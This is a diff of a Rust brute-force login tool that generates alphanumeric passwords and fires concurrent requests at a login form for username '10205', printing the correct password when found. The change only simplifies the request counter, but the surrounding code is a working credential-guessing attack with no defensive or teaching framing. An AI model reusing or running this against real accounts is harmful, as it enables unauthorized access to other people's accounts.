@@ -1,10 +1,9 @@
 use chrono::prelude::*;
-use std::sync::atomic::{AtomicUsize, Ordering};
 
 use itertools::Itertools;
 use tokio::task::JoinHandle;
 
-async fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
+fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
     let charset: &'a str = "abcdefghijklmnopqrstuvwxyz0123456789";
 
     (1..=20)
@@ -20,11 +19,11 @@ async fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
 }
 
 async fn sending_requests() {
-    let request_amount = std::sync::Arc::new(AtomicUsize::new(0));
+    let mut request_amount = 0;
     let mut tasks: Vec<JoinHandle<Result<(), ()>>> = Vec::new();
 
-    for password in password_generator().await {
-        request_amount.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    for password in password_generator() {
+        request_amount += 1;
 
         tasks.push(tokio::spawn(async move {
             let fields = [("username", "10205"), ("password", &password)];
@@ -43,7 +42,7 @@ async fn sending_requests() {
                                     "[{}] Correct Password: '{}'; Request Amount: {}",
                                     Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                     &password,
-                                    request_amount.load(Ordering::SeqCst)
+                                    request_amount
                                 );
                                 std::process::exit(1);
                             }
